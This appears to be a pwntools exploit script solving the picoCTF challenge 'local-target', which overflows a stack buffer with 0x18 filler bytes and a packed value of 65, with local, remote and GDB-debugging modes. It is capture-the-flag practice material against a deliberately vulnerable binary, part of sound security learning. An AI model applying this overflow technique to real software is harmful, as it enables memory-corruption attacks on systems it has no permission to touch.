#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 50209
HOST = "saturn.picoctf.net"
exe = context.binary = ELF('./local-target', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	b*0x401295
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

pl = b'A'*0x18 + p64(65)
# GDB()
p.sendlineafter(b"string: ", pl)

p.interactive()
